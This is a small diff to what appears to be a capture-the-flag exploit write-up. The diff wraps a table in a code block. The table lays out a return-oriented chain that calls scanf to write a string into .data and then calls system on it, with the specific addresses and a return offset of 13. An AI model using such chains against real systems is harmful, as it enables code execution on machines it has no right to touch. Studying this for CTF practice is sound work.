@@ -14,8 +14,11 @@ We will change the return address to scanf and give its parameters using stack. 
 Address of pop,pop,ret is `0x080487ba`
 
 So now we can form our stack:
+
+```
 | scanf address(0x08048460)  | ret address(0x080487ba)(pop pop ret)  | address of %9s(0x0804882f) | write address(0x08049b24)(.data) |
 | system address(0x08048430) | anything(return address after system) | 0x08049b24(.data)          |
+```
 
 Offset of first return is 13(arr[13]).
 
